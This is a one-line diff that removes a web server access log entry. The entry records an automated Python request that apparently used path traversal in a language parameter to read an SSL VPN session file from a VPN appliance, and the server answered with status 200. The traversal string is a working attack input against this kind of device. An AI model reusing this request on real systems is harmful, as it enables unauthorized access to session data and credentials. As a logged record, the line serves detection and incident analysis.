@@ -1,1 +1,0 @@
-::ffff:192.64.113.244 - - [07/Jun/2022:21:49:33 +0000] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 200 2441 "-" "Python-urllib/3.8"
